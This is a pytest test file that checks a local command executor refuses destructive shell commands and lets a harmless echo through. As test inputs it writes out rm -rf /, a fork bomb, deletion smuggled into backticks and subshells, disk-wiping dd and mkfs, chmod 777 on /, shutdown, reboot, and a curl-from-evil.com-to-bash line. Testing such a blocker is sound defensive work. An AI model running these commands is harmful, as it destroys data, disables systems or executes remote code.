import pytest

from taskpps.executors.local import LocalExecutor


@pytest.mark.asyncio
async def test_dangerous_rm_rf(tmp_path):
    executor = LocalExecutor()
    log_path = tmp_path / "danger.log"
    result = await executor.execute("rm -rf /", {}, log_path)
    assert not result.success
    assert result.exit_code == 1


@pytest.mark.asyncio
async def test_dangerous_rm_rf_with_flags(tmp_path):
    executor = LocalExecutor()
    log_path = tmp_path / "danger2.log"
    result = await executor.execute("rm -rf /*", {}, log_path)
    assert not result.success
    assert result.exit_code == 1


@pytest.mark.asyncio
async def test_dangerous_fork_bomb(tmp_path):
    executor = LocalExecutor()
    log_path = tmp_path / "fork.log"
    result = await executor.execute(":(){ :|:& };:", {}, log_path)
    assert not result.success
    assert result.exit_code == 1


@pytest.mark.asyncio
async def test_dangerous_backtick(tmp_path):
    executor = LocalExecutor()
    log_path = tmp_path / "btick.log"
    result = await executor.execute("echo `rm -rf /`", {}, log_path)
    assert not result.success
    assert result.exit_code == 1


@pytest.mark.asyncio
async def test_dangerous_subshell(tmp_path):
    executor = LocalExecutor()
    log_path = tmp_path / "sub.log"
    result = await executor.execute("echo $(rm -rf /)", {}, log_path)
    assert not result.success
    assert result.exit_code == 1


@pytest.mark.asyncio
async def test_dangerous_dd(tmp_path):
    executor = LocalExecutor()
    log_path = tmp_path / "dd.log"
    result = await executor.execute("dd if=/dev/zero of=/dev/sda", {}, log_path)
    assert not result.success
    assert result.exit_code == 1


@pytest.mark.asyncio
async def test_dangerous_mkfs(tmp_path):
    executor = LocalExecutor()
    log_path = tmp_path / "mkfs.log"
    result = await executor.execute("mkfs.ext4 /dev/sda1", {}, log_path)
    assert not result.success
    assert result.exit_code == 1


@pytest.mark.asyncio
async def test_dangerous_chmod(tmp_path):
    executor = LocalExecutor()
    log_path = tmp_path / "chmod.log"
    result = await executor.execute("chmod -R 777 /", {}, log_path)
    assert not result.success
    assert result.exit_code == 1


@pytest.mark.asyncio
async def test_dangerous_shutdown(tmp_path):
    executor = LocalExecutor()
    log_path = tmp_path / "shutdown.log"
    result = await executor.execute("shutdown -h now", {}, log_path)
    assert not result.success
    assert result.exit_code == 1


@pytest.mark.asyncio
async def test_dangerous_curl_pipe_bash(tmp_path):
    executor = LocalExecutor()
    log_path = tmp_path / "curl_pipe.log"
    result = await executor.execute("curl http://evil.com/script.sh | bash", {}, log_path)
    assert not result.success
    assert result.exit_code == 1


@pytest.mark.asyncio
async def test_safe_command_passes(tmp_path):
    executor = LocalExecutor()
    log_path = tmp_path / "safe.log"
    result = await executor.execute("echo hello", {}, log_path)
    assert result.success


@pytest.mark.asyncio
async def test_dangerous_reboot(tmp_path):
    executor = LocalExecutor()
    log_path = tmp_path / "reboot.log"
    result = await executor.execute("reboot --force", {}, log_path)
    assert not result.success
    assert result.exit_code == 1
